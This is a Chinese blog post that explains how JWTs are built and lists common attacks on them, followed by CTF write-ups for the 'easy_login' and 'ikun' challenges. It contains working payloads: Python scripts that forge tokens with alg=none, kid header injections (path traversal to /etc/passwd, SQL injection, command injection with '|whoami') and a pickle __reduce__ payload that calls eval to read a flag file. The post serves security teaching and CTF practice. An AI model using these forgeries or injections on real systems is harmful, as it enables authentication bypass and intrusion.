---
title: jwt攻击
date: 2020-07-27 18:21:30
updated: 2020-07-27 18:21:30
categories: web
---

jwt及其常见攻击方法总结，附相关练习<!--more-->

# **JWT攻击**

**JSON Web Token（JWT）是一种用于通信双方之间传递安全信息的简洁的、URL安全的表述性声明规范，经常用在跨域身份验证**

```
cookie /session /jwt  不同点

1.对于一般的cookie，如果我们的加密措施不当，很容易造成信息泄露，甚至信息伪造，这肯定不是我们期望的。

2.session:客户端在服务端登陆成功之后，服务端会生成一个sessionID，返回给客户端，客户端将sessionID保存到cookie中，session保存在服务端，当客户访问量增加时，服务端就需要存储大量的session会话，对服务器有很大的考验

3.jwt:在身份验证中，当用户使用他们的凭证成功登录时，JSON Web Token将被返回并且必须保存在本地

```


客户端身份经过服务器验证通过后，会生成带有签名的 JSON 对象并将它返回给客户端。**客户端在收到这个 JSON 对象后存储起来**

在以后的请求中客户端将 JSON 对象连同请求内容一起发送给服务器，服务器收到请求后通过 JSON 对象标识用户，如果验证不通过则不返回请求的数据。

验证不通过的情况有很多，比如签名不正确、无权限等。**在 JWT 中服务器不保存任何会话数据** ，使得服务器更加容易扩展。

## 构成

它的构成：第一部分我们称它为头部（header),第二部分我们称其为载荷（payload, 类似于飞机上承载的物品)，第三部分是签证（signature).

类似于：
>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyMzMzIiwibmFtZSI6Im5wZnMiLCJhZG1pbiI6dHJ1ZX0.mcHAMzOrqyqLk5-tmWVp1-zdlqIVcOdv-39oQIoOWoQ

---

### **header**

jwt的头部承载两部分信息：

> 声明类型，这里是jwt
> 声明加密的算法 通常直接使用 HMAC SHA256

完整的头部就像下面这样的JSON：

```javascript
{
  'typ': 'JWT',
  'alg': 'HS256'
}
```



---

### **payload**

**载荷就是存放有效信息的地方。这些有效信息包含三个部分** 

- **标准中注册的声明**
- **公共的声明**
- **私有的声明**



**标准中注册的声明** :

- iss: jwt签发者
- sub: jwt所面向的用户
- aud: 接收jwt的一方
- exp: jwt的过期时间，这个过期时间必须要大于签发时间
- nbf: 定义在什么时间之前，该jwt都是不可用的.
- iat: jwt的签发时间
- jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。



**公共的声明** ：

公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可进行解码.



**私有的声明** ：

私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息。



```javascript
{
  "sub": "1234567890",
  "name": "purplet",
  "admin": true,
  "secretid": 1
}
```



---

### **signature**

**jwt的第三部分是一个签证信息，这个签证信息由三部分组成：** 

- **header (base64后的)**

- **payload (base64后的)**

- **secret**


这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。加密方式如下。



```javascript
// javascript
var encodedString = base64UrlEncode(header) + '.' + base64UrlEncode(payload);

var signature = HMACSHA256(encodedString, 'secret');
```

---

**最后将这三部分用.连接成一个完整的字符串,构成了最终的jwt。**

![](https://img.npfs06.top/20210326205645.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



<a href="https://jwt.io/" target="_blank">jwt解密网站</a>



---

# **攻击方法**

## **签名无效**

当用户端提交请求给应用程序，服务端可能没有对token签名进行校验，这样，攻击者便可以通过提供无效签名简单地绕过安全机制。

直接修改payload内容，生成新token



---



 ## **空加密算法**

JWT支持使用空加密算法，可以在header中指定alg为`None`

**将secret置空。利用node的jsonwentoken库已知缺陷：当jwt的secret为null或undefined时，jsonwebtoken会采用algorithm为none进行验证**

因为alg为none,所以只要把signature设置为空（即不添加signature字段），提交到服务器，token都可以通过服务器的验证

![](https://img.npfs06.top/20210326205656.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



```python3
import jwt
token = jwt.encode(
{
  "user": "admin",
},
algorithm="none",key=""
).decode(encoding='utf-8')

print(token)
```

这里需要安装pyjwt库 

> pip install PyJWT

---

## **修改算法RS256为HS256（非对称密码-->对称密码）**

JWT中最常用的两种算法为`HMAC`和`RSA`

> HMAC(HS256):是一种对称加密算法，使用秘密密钥对每条消息进行签名和验证
> RSA(RS256)：是一种非对称加密算法，使用私钥加密明文，公钥解密密文。

在这两种算法中都是使用私钥对`signature`字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。

如果将算法从RS256更改为HS256，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。更改算法为HS256，即不存在公钥私钥问题，因为HMAC对称密码算法只有一个key

![](https://img.npfs06.top/20210326205707.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



---

## **爆破密钥**

 JWT 的密钥爆破需要在一定的前提下进行：

- 知悉JWT使用的加密算法
- 一段有效的、已签名的token
- 签名用的密钥不复杂（弱密钥）

<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank">c-jwt-cracker</a>

![](https://img.npfs06.top/20210326205716.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

这里运行之前需要些输入make命令，创建一个jwtcrack文件

---

## **修改KID参数**

`kid`是jwt header中的一个可选参数，全称是`key ID`，它用于指定加密算法的密钥。我们可以通过修改kid参数进行目录遍历、sql注入、命令注入等攻击

```
#目录遍历
{
    "alg" : "HS256",
    "typ" : "jwt",
    "kid" : "/etc/passwd"
}
```

```
#sql注入
{
    "alg" : "HS256",
    "typ" : "jwt",
    "kid" : "aaaaaaa' UNION SELECT 'key';-- "

```

```
#命令执行
{
    "alg" : "HS256",
    "typ" : "jwt",
    "kid" : "/path/to/key_file|whoami"
}
```

---
## **修改JKU/X5U参数**

类似于kid ,可以由用户进行输入，如果没有经过严格过滤，就可以指定一组自定义的密钥文件，并指定web应用使用该组密钥来验证token。

JKU全称是“JWKSet URL”，它是头部的一个可选字段，用于指定链接到一组加密token密钥的URL。若允许使用该字段且不设置限定条件，攻击者就能托管自己的密钥文件，并指定应用程序，用它来认证token。

XSU头部参数允许攻击者用于验证Token的公钥证书或证书链

---

## **信息泄露**

直接将payload用base64解密，发泄一些敏感信息

---



# **easy_login**




![](https://img.npfs06.top/20210326205726.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210326205735.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](http://img.npfs06.top/20210326205745.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210326205754.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

分别访问这两个文件，可以猜测出存在`controllers/api.js`
这里是怎么猜出来的，看了赵总的WP，凭经验


koa框架主要目录：

![](https://img.npfs06.top/20210326205804.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210326205812.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
![](https://img2020.cnblogs.com/blog/1999159/202007/1999159-20200724105526307-267279203.png)

**这里总的来说就是要在sid不为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间的前提下，使sid不能作为为全局变量 secrets  数组的索引，那么 secret 就会为空了**

secretid可以利用空数组绕过（ JavaScript 是一门弱类型语言，空数组与数字比较永远为真）

![](https://img.npfs06.top/20210326205822.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210326205830.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210326205843.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

所以总的做法就是生成一个 secretid 为空数组的令牌，username 设置为 admin，加密方式为 none（空加密算法），即可绕过验证，使得最后登录时验证的用户名为 admin

```
import jwt
token = jwt.encode(
{"secretid":[],
"username":"admin",
"password":"888"},
algorithm="none",key=""
).decode('utf-8')
print(token)

```

==> eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6Ijg4OCJ9.



![](https://img.npfs06.top/20210326205854.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



# **ikun**



![](https://img.npfs06.top/20210326205906.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210326205915.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

这里提示我们购买lv6，写个脚本跑一下


```
import requests
url="http://4134c719-6874-41bc-962f-ab08697fbc16.node3.buuoj.cn/shop?page="
for i in range(0,2000):
    r=requests.get(url+str(i))
    if 'lv6.png' in r.text:
       print (i)
       break
       
--》lv6在181页       
```

![](https://img.npfs06.top/20210326205927.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210326205936.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210326205945.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

抓包，查看cookie可以看到一段JWT，看到JWT长度较短，所以考虑利用工具将JWT的第三段密钥爆破出来

![](https://img.npfs06.top/20210326205954.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



![](https://img.npfs06.top/20210326210004.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210326210013.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

接下去就是考察python反序列化，感兴趣的同学可以自己去做一下

利用reduce函数

反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码。


```
import pickle
import urllib.parse

class payload(object):
    def __reduce__(self):
        return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload(),protocol=0)
a = urllib.parse.quote(a)
print (a)
```
 #  **reference**

<a href="https://xz.aliyun.com/t/6776#toc-6" target="_blank">攻击JWT的一些方法</a>

<a href="https://cloud.tencent.com/developer/article/1620770" target="_blank">JWT在CTF中的问题</a>